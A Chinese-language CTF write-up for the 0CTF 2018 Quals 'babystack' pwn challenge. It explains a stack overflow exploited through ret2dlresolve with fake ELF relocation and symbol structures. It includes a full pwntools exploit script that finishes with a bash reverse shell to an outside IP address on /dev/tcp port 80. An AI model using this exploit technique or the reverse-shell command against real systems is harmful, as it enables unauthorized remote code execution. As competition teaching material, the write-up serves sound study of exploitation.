---
title: "0CTF 2018 Quals：Baby Stack"
description: 使用 ret2dlresolve，在沒有資訊洩漏與 libc 的情況下利用 0CTF 2018 Quals Baby Stack。
slug: 0ctf-2018-quals-baby-stack
date: 2018-06-22 23:36:52+08:00
categories:
    - Writeup
tags:
    - CTF
    - Pwn
    - ret2dlresolve
---

> 題目連結： [babystack](http://dl.0ops.net/2018/babystack.tar.gz)
>
> 分類：Pwn
>
> 原始文章： `https://ss8651twtw.github.io/blog/writeup/0CTF-2018-Quals:Baby-Stack/`

在 2018 年，利用 stack overflow 已經不再需要 info leak。

<!--more-->

好好享受 babystack 吧。

202.120.7.202:6666

## 保護機制

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

## 分析

- `pow.py`

它是 babystack 的 wrapper，加入 proof-of-work，將輸入長度限制為 `0x100`，並把 stdout 和 stderr pipe 到 `/dev/null`。

- `babystack`

程式只會設定 alarm，然後讀取 buffer。

```c
ssize_t sub_804843B()
{
  char buf; // [esp+0h] [ebp-28h]

  return read(0, &buf, 0x40u);
}

int __cdecl main()
{
  alarm(0xAu);
  sub_804843B();
  return 0;
}
```

## 漏洞

程式沒有 stack canary，而且可以向 buf 讀入過多字元。

- `read(0, &buf, 0x40u)` 存在 **buffer overflow**

## 思路

- 沒有 output function，因此無法進行 information leak
- 沒有提供 libc，猜測 function offset 可能很困難
- 啟用了 NX，因此無法讀入 shellcode 後跳轉執行

根據題目描述「info leak is no longer required」，表示可以使用 ret2dlresolve 技巧來完成利用。

利用步驟如下：

1. 使用 ROP 讀入偽造的資料結構，然後 ret2main
2. 使用 ret2dlresolve 呼叫 `system("/bin/sh")`

需要偽造的資料結構：

- `Elf32_Rel`

```
/* Relocation table entry without addend (in section of type SHT_REL).  */
typedef struct
{
  Elf32_Addr        r_offset;                /* Address */
  Elf32_Word        r_info;                  /* Relocation type and symbol index */
} Elf32_Rel;
```

https://code.woboq.org/userspace/glibc/elf/elf.h.html#633

- `Elf32_Sym`

```
/* Symbol table entry.  */
typedef struct
{
  Elf32_Word        st_name;                 /* Symbol name (string tbl index) */
  Elf32_Addr        st_value;                /* Symbol value */
  Elf32_Word        st_size;                 /* Symbol size */
  unsigned char     st_info;                 /* Symbol type and binding */
  unsigned char     st_other;                /* Symbol visibility */
  Elf32_Section     st_shndx;                 /* Section index */
} Elf32_Sym;
```

https://code.woboq.org/userspace/glibc/elf/elf.h.html#518

`_dl_runtime_resolve` 的運作流程：

```
     _dl_runtime_resolve(link_map, reloc_arg)
                                       +
          +-----------+                |
          | Elf32_Rel | <--------------+
          +-----------+
     +--+ | r_offset  |        +-----------+
     |    |  r_info   | +----> | Elf32_Sym |
     |    +-----------+        +-----------+      +----------+
     |      .rel.plt           |  st_name  | +--> | system\0 |
     |                         |           |      +----------+
     v                         +-----------+        .dynstr
+----+-----+                      .dynsym
| <system> |
+----------+
  .got.plt
```

- fake `Elf32_Rel`
    - `r_offset` 必須可寫入（解析 symbol 後會寫入 function 的實際位址）
    - `r_info` 的高 24 bits
        - `(r_info >> 8) * 16` 必須指向偽造的 `Elf32_Sym`（16 是 `Elf32_Sym` 的大小）
    - `r_info` 的低 8 bits
        - 必須是 `0x07`（R_386_JMP_SLOT）

- fake `Elf32_Sym`
    - `.dynstr + st_name` 必須指向 `system` 字串

讀入偽造的 `Elf32_Rel`、`Elf32_Sym` 結構，接著 ret2main 以呼叫 `_dl_runtime_resolve`。

- 使用 `plt0`

```
Disassembly of section .plt:

080482f0 <read@plt-0x10>:                                             // plt0
 80482f0:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004 // push link_map
 80482f6:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008 // jmp _dl_runtime_resolve
```

可以計算 `reloc_arg`，讓 `.rel.plt + reloc_arg` 指向偽造的結構，再跳到 `plt0`，使其將 symbol 解析為 `system`。

完成 symbol 解析後，`_dl_runtime_resolve` 便會呼叫該 function。

## 利用程式

```python
#!/usr/bin/env python

from pwn import *
from hashlib import sha256
import time

# r = process('./babystack')
r = remote('202.120.7.202', 6666)

def verify():
    data = r.recvline()[:-1]
    for i in xrange(2 ** 32):
        if sha256(data + p32(i)).digest().startswith('\0\0\0'):
            break
    r.send(p32(i))
    log.info('POW is over')
    sleep(0.5)

def send(data, length):
    time.sleep(0.1)
    r.send(data.ljust(length))

plt0 = 0x80482f0
relplt = 0x80482b0
dynsym = 0x80481cc
dynstr = 0x804822c

main = 0x8048457
read_plt = 0x8048300

buf = 0x804a500

rop = flat(
        # _dl_runtime_resolve call and reloc_arg
        plt0, buf - relplt, # will resolve system
        0xdeadbeef, # return address
        buf + 36 # parameter "/bin/sh"
        )

data = flat(
        # Elf32_Rel
        buf, 0x7 | ((buf + 12 - dynsym) / 16) << 8, 0xdeadbeef, # 0xdeadbeef is padding
        # Elf32_Sym
        buf + 28 - dynstr, 0, 0, 0x12,
        'system\x00\x00',
        '/bin/sh\x00'
        )

verify()

# read data to buf
send('a' * 44 + flat(read_plt, main, 0, buf, 44), 0x40)
send(data, 44)

# use ret2dlresolve to call system("/bin/sh")
send('a' * 44 + rop, 0x40)

# make a reverse shell
send('bash -c "bash -i &>/dev/tcp/35.201.141.84/80 0>&1"', 0x100)

r.interactive()
```

`flag{return_to_dlresolve_for_warming_up}`

## 參考資料

https://www.slideshare.net/AngelBoy1/re2dlresolve

https://www.youtube.com/watch?v=wsIvqd9YqTI
